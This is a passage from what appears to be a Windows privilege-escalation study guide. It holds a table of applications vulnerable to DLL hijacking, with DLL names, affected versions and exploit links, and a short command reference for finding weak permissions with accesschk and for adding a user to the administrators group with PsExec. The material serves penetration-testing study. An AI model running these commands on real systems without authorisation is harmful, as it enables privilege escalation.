| **Firefox (htm, html, jtx, mfp, shtml, xaml)***(dwmapi.dll)* | [<= 3.6.8](http://www.exploit-db.com/exploits/14730)**(fixed in 3.6.9 and 3.5.12)** |
| **Mozilla Thunderbird (eml,html)***(dwmapi.dll)* | 3.1.2 **(fixed in 3.1.3)** |
| **MUVEE** | - |
| **Muvee Reveal (rvl)***(peerdist.dll)* | 7.0.43 build 11502 |
| **NETSTUMBLER** | - |
| **NetStumbler (ns1)***(mfc71enu.dll, mfc71loc.dll)* | 0.4.0 |
| **NITRO** | - |
| **Nitro PDF Reader (pdf)***(dwmapi.dll, nprender.dll)* | **fixed in 1.3** |
| **NOKIA** | - |
| **Nokia Suite ContentCopier***(wintab32.dll)* | - |
| **Nokia Suite Communication Centre***(wintab32.dll)* | - |
| **NOTEPAD++** | - |
| **Notepad++ (shtml, css, inc, inf, ini, log, scp, wtx, shtml)***(scinlexer.dll)* | 5.7 **(fixed in 5.8)** |
| **NUANCE** | - |
| **Nuance PDF (pdf)***(dwmapi.dll, exceptiondump.dll)* | <= 6.0 |
| **NULLSOFT** | - |
| **Winamp (669,aac,aiff,amf,au,avr,b4s,caf,cda)***(wnaspi32.dll, dwmapi.dll)* | [5.581](http://www.exploit-db.com/exploits/14789/) |
| **Winamp (b4s, m3u8, m3u, pls)***(wnaspi32.dl)* | 5.5.8.2985 (Win7 x64) |
| **NVIDIA** | - |
| **NVidia Driver (tvp)***(nview.dll)* | [latest](http://www.exploit-db.com/exploits/14769/) |
| **OMNIPEEK** | - |
| **Omnipeek Personal (pkt, wac)***(mfc71loc.dll)* | 4.1 |
| **OPERA** | - |
| **Opera (htm, html, mht, mhtml, xht, xhtm, xhtl)***(dwmapi.dll)* | [<= 10.61](http://www.exploit-db.com/exploits/14732) |
| **Opera widgets (wgt)** | - |
| **ORACLE** | - |
| **Java Web Start (javaw.exe) (jnlp**)*(schannel.dll)* | 1.6 update 21 |
| **P****GP** | - |
| **PGP Desktop (pgp)***(credssp.dll)* | [<= 9.8](http://www.s3cur1ty.de/m1adv2010-004) |
| **PGP Desktop (p12,pem,pgp,prk,prvkr,pubkr,rnd,skr)***(tsp.dll, tvttsp.dll)* | <= 9.10<= 10.0.0 |
| **PIXIA** | - |
| **Pixia (pxa)***(wintab32.dll)* | 3.1j |
| **PUTTY** | - |
| **putty***(winmm.dll)* | [0.60](http://www.exploit-db.com/exploits/14796/) |
| **QT WEB** | - |
| **QtWeb (htm, html, mhtml, xml)***(wintab32.dll)* | <= 3.3 b043 |
| **QCCIS** | - |
| **Forensic CaseNotes (notes)***(credssp.dll)* | [<= 1.3.2010.6](http://www.s3cur1ty.de/m1adv2010-005) |
| **REAL** | - |
| **Real Player***(wnaspi32.dll)* | <= 1.1.5 build 12.0.0.879 |
| **RIM / BLACKBERRY** | - |
| **Blackberry Desktop Manager***(mapi32x.dll)* | **<= 6.0.0 (fixed in 6.0.0.43)** |
| **ROXIO** | - |
| **Roxio Photosuite***(homeutils9.dll)* | [9](http://www.exploit-db.com/exploits/14752) |
| **Roxio MyDVD (dmsd,dmsm)***(homeutils9.dll)* | [9](http://www.exploit-db.com/exploits/14781) |
| **Roxio Creator DE***(homeutils9.dll)* | [<= 9.0.116](http://www.exploit-db.com/exploits/14768/) |
| **Roxi Central (c2d,cue,gi,iso,roxio)***(homeutils10.dll, dlaapi_w.dll, sonichttpclient10.dll, tfswapi.dll)* | 3.6 |
| **SEAMONKEY** | - |
| **SeaMonkey (html, xml, txt, jpg)***(dwmapi.dll)* | <= 2.0.6 **(fixed in 2.0.7)** |
| **SI SOFTWARE** | - |
| **SiSoft Sandra***(dwmapi.dll)* | - |
| **SMPLAYER** | - |
| **SMPlayer***(wintab32.dll)* | 0.6.9 |
| **STEAM** | - |
| **Steam Games***(steamgamesupport.dll)* | - |
| **SOMUD** | - |
| **SoMud P2P (torrent)***(wintab32.dll)* | <= 1.2.8 |
| **SONY** | - |
| **Sound Forge Pro***(mtxparhvegaspreview.dll)* | 10.0 |
| **SORAX** | - |
| **Sorax PDF Reader (pdf)***(dwmapi.dll)* | <= 2.0 |
| **SKYPE** | - |
| **Skype***(wab32.dll)* | [<= 4.2.0.169](http://www.exploit-db.com/exploits/14766) |
| **SWEETSCAPE** | - |
| **010 Editor (lsc,bt,hex,s19,s28,s37)***(wintab32.dll)* | 3.1.2 |
| **TEAMMATE** | - |
| **Teammate audit mgmt software suite***(mfc71enu.dll)* | [v8](http://www.exploit-db.com/exploits/14747) |
| **TEAMVIEWER** | - |
| **Teamviewer (tvc, tvs)***(dwmapi.dll)* | [<= 5.0.8703](http://www.exploit-db.com/exploits/14734)**(patched in 5.1.9072)** |
| **TECHSMITH** | - |
| **TechSmith Snagit (.snag)***(dwmapi.dll)* | [<= 10 build 788](http://www.exploit-db.com/exploits/14764) |
| **TechSmith Snagit accessories (results)** | latest |
| **TechSmith Snagit profiles (snagprof)** | latest |
| **TORTOISE** | - |
| **Tortoise SVN (all registered filetypes)***(dwmapi.dll)* | v1.6.10 (b19898) |
| **TRACKER SOFTWARE** | - |
| **PDFXChange Viewer (pdf)***(wintab32.dll)* | <= 2.0 (b54.0) |
| **ULTRA** | - |
| **Ultra VNC Viewer (vnc)***(vnclang.dll)* | <= 1.0.6.4 |
| **uTORRENT** | - |
| **uTorrent***(userenv.dll, shfolder.dll, dnsapi.dll, dwmapi.dll, iphlpapi.dll,dhcpcsvc.dll, dhcpcsvc6.dll, rpcrtremote.dll)***.torrent ***(plugin_dll.dll)* | [<= 2.0.3](http://www.exploit-db.com/exploits/14748) / [<= 2.0.3](http://www.exploit-db.com/exploits/14726)**(fixed in **[**2.0.4**](http://forum.utorrent.com/viewtopic.php?id=82840)** (b21431))** |
| **VIDEOLAN** | - |
| **VLC media player (mp3)***(wintab32.dll)* | [<= 1.1.3](http://www.exploit-db.com/exploits/14750)**(fixed in [1.1.4](http://git.videolan.org/?p=vlc/vlc-1.1.git;a=blobdiff;f=bin/winvlc.c;h=ac9b97ca9f5f9ba001f13bf61eb5127a1c1dbcbf;hp=2d09cba320e3b0def7069ce1ebab25d1340161c5;hb=43a31df56c37bd62c691cdbe3c1f11babd164b56;hpb=2d366da738b19f8d761d7084746c6db6f52808c6))** |
| **VIRTUAL DJ** | - |
| **Virtual DJ (mp3)***(hdjapi.dll)* | 6.1.2 |
| **WINMERGE** | - |
| **WinMerge***(mfc71*.dll)* | 2.12.4 |
| **WIRESHARK** | - |
| **Wireshark (5vw, acp, apc, atc,bfr,cap,enc,erg,fdc,pcap,...)***(airpcap.dll, tcapi.dll)* | [<= 1.2.10](http://www.exploit-db.com/exploits/14721)**(patched in 1.4)** |
| **dumpcap (5vw, acp, apc, atc,bfr,cap,enc,erg,fdc,pcap,...)***(airpcap.dll, tcapi.dll)* | <= 1.2.10**(patched in 1.4)** |


# Command Reference

These are important command which you will be using quite often, since you have to find the vulnerable directory or path or file.

## File Permissions

### Find all weak folder permissions per drive.

    accesschk.exe -uwdqs Users c:\
    accesschk.exe -uwdqs "Authenticated Users" c:\

### Find all weak file permissions per drive.

    accesschk.exe -uwqs Users c:\*.*
    accesschk.exe -uwqs "Authenticated Users" c:\*.*

## Networking

## Executing Commands

### Executing command as another user using psexec

    # PsExec
    PsExec.exe –accepteula –u adminuser –p password c:\windows\system32\net.exe localgroup administrators MyDomain\currentusername /add

    # Runas
    runas /user:virgil cmd.exe // This will popup a new cmd so better use this to create new user or put yourself in admin group.

    # Restart the victim system as the registry changes need to be updated
    shutdown /r /t 1

# Appendix

Enumeration 1: http://www.fuzzysecurity.com/tutorials/16.html
Enumeration 2: http://hackingandsecurity.blogspot.in/2017/09/oscp-windows-priviledge-escalation.html
Enumeration 3: https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html
